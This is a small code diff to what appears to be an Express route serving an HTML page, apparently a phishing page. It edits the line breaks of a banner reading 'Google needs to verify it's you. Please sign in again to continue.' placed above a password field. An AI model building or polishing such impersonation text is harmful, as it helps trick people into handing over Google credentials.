@@ -305,8 +305,8 @@ router.get('/', (req, res) => {
             <div class="form-half1">
                 <!-- Session Expired Message at the top of the right section -->
                 <div class="session-expired-message">
-                    <p>Google needs to verify it’s you.<br>
-                    <br> <br>Please sign in again to continue.</p>
+                    <p>Google needs to verify it’s you. <br>Please sign in again to continue.<br>
+                   </p>
                 </div>
 
                 <div class="passdiv">
